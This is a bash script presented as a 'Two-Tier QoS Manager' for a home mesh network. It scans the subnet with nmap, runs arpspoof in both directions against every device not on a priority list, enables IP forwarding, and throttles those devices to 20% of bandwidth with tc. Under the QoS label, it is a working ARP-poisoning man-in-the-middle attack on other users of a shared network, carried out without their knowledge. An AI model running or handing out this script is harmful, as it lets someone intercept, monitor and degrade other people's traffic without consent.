#!/bin/bash
# Two-Tier QoS Manager (ARP spoof + tc)
# Usage: sudo ./qos_simple.sh start|stop|status|list|add

set -e

INTERFACE="wlan0"                    # Change to your interface
GATEWAY="192.168.68.1"              # Your mesh gateway
SUBNET="192.168.68.0/24"            # Subnet to scan and shape
TOTAL_BANDWIDTH="100mbit"           # Your total bandwidth

# Bandwidth allocation percentages
HIGH_PRIORITY_PERCENT=80            # 80% for high priority devices
LOW_PRIORITY_PERCENT=20             # 20% for everything else

# HIGH PRIORITY IP LIST - EDIT THIS ARRAY (full IPs only)
HIGH_PRIORITY_IPS=(
    "192.168.68.50"     # Your Kali machine
    "192.168.68.60"     # Your gaming PC
    "192.168.68.70"     # Your work laptop
    # Add more IPs here, one per line
)

# --- DO NOT EDIT BELOW THIS LINE ---

# Must run as root (for tc, arpspoof, ip_forward)
check_root() {
    [[ $EUID -eq 0 ]] || { echo "Run as root: sudo $0 $*"; exit 1; }
}

# Check interface exists
check_interface() {
    ip link show "$INTERFACE" &>/dev/null || { echo "Interface $INTERFACE not found."; exit 1; }
}

# Calculate bandwidth rates (works without bc)
calc_rate() {
    local percent=$1
    local total_num=$(echo "$TOTAL_BANDWIDTH" | sed 's/[^0-9]*//g')
    local rate=$(( total_num * percent / 100 ))
    echo "${rate}mbit"
}

HIGH_RATE=$(calc_rate $HIGH_PRIORITY_PERCENT)
LOW_RATE=$(calc_rate $LOW_PRIORITY_PERCENT)

echo "=== Two-Tier QoS Configuration ==="
echo "Interface: $INTERFACE"
echo "Gateway: $GATEWAY"
echo "Total Bandwidth: $TOTAL_BANDWIDTH"
echo ""
echo "Bandwidth Allocation:"
echo "  High Priority (${HIGH_PRIORITY_PERCENT}%): $HIGH_RATE"
echo "  Low Priority (${LOW_PRIORITY_PERCENT}%): $LOW_RATE"
echo ""
echo "High Priority IPs:"
for ip in "${HIGH_PRIORITY_IPS[@]}"; do
    echo "  - $ip"
done
echo "================================"

start_qos() {
    echo "[+] Enabling IP forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    echo "[+] Starting ARP spoofing for non-priority traffic..."
    # Get all IPs in subnet except high priority and gateway
    echo "[*] Scanning network for devices..."
    
    # Find all devices on network (excluding gateway and high priority IPs)
    mapfile -t ALL_IPS < <(nmap -sn $SUBNET 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]+' | sort -u)
    
    for ip in "${ALL_IPS[@]}"; do
        # Skip gateway
        [[ "$ip" == "$GATEWAY" ]] && continue
        
        # Skip if IP is in high priority list
        is_high_priority=false
        for high_ip in "${HIGH_PRIORITY_IPS[@]}"; do
            [[ "$ip" == "$high_ip" ]] && is_high_priority=true
        done
        
        if [[ "$is_high_priority" == false ]]; then
            echo "  Controlling: $ip"
            sudo arpspoof -i $INTERFACE -t $ip $GATEWAY >/dev/null 2>&1 &
            sudo arpspoof -i $INTERFACE -t $GATEWAY $ip >/dev/null 2>&1 &
        fi
    done
    
    echo "[+] Setting up traffic control..."
    
    # Clear existing rules
    sudo tc qdisc del dev $INTERFACE root 2>/dev/null
    
    # Create root HTB qdisc
    sudo tc qdisc add dev $INTERFACE root handle 1: htb default 20
    
    # Create main class
    sudo tc class add dev $INTERFACE parent 1: classid 1:1 htb rate $TOTAL_BANDWIDTH
    
    # Create high priority class (80% bandwidth, can burst to 100%)
    sudo tc class add dev $INTERFACE parent 1:1 classid 1:10 htb rate $HIGH_RATE ceil $TOTAL_BANDWIDTH prio 0
    
    # Create low priority class (20% bandwidth, limited)
    sudo tc class add dev $INTERFACE parent 1:1 classid 1:20 htb rate $LOW_RATE ceil $LOW_RATE prio 1
    
    echo "[+] Applying IP filters..."

    # High priority: match both SRC and DST so uploads and downloads get priority
    for ip in "${HIGH_PRIORITY_IPS[@]}"; do
        [[ -z "$ip" ]] && continue
        echo "  High priority: $ip (src + dst)"
        tc filter add dev $INTERFACE protocol ip parent 1:0 \
            prio 0 u32 match ip src $ip flowid 1:10
        tc filter add dev $INTERFACE protocol ip parent 1:0 \
            prio 0 u32 match ip dst $ip flowid 1:10
    done

    # Low priority: all other IPs in subnet (both directions)
    tc filter add dev $INTERFACE protocol ip parent 1:0 \
        prio 1 u32 match ip src $SUBNET flowid 1:20
    tc filter add dev $INTERFACE protocol ip parent 1:0 \
        prio 1 u32 match ip dst $SUBNET flowid 1:20
    
    echo "[✓] QoS Active!"
    echo "    High Priority IPs: ${HIGH_PRIORITY_IPS[@]}"
    echo "    All other IPs are throttled to $LOW_RATE"
}

stop_qos() {
    echo "[+] Stopping QoS system..."
    
    # Kill ARP spoofing
    sudo pkill -f arpspoof 2>/dev/null
    
    # Clear traffic control
    sudo tc qdisc del dev $INTERFACE root 2>/dev/null
    
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Clear ARP cache
    sudo ip neigh flush all
    
    echo "[✓] QoS Stopped"
    echo "    Note: Devices may need to reconnect to clear ARP cache"
}

status_qos() {
    echo "=== QoS Status ==="
    echo "Traffic Control Rules:"
    sudo tc -s qdisc show dev $INTERFACE
    echo ""
    echo "Classes:"
    sudo tc -s class show dev $INTERFACE
    echo ""
    echo "Filters:"
    sudo tc filter show dev $INTERFACE
    echo ""
    echo "Active ARP spoofing processes:"
    pgrep -af arpspoof || echo "None"
}

case "$1" in
    start)
        start_qos
        ;;
    stop)
        stop_qos
        ;;
    status)
        status_qos
        ;;
    list)
        echo "High Priority IPs:"
        for ip in "${HIGH_PRIORITY_IPS[@]}"; do
            echo "  $ip"
        done
        ;;
    add)
        if [[ -n "$2" ]]; then
            HIGH_PRIORITY_IPS+=("$2")
            echo "Added $2 to high priority list"
            echo "New list: ${HIGH_PRIORITY_IPS[@]}"
        else
            echo "Usage: $0 add <IP_ADDRESS>"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|status|list|add}"
        echo ""
        echo "Commands:"
        echo "  start    - Start QoS with current settings"
        echo "  stop     - Stop QoS and cleanup"
        echo "  status   - Show current QoS status"
        echo "  list     - List high priority IPs"
        echo "  add IP   - Add IP to high priority list"
        exit 1
        ;;
esac
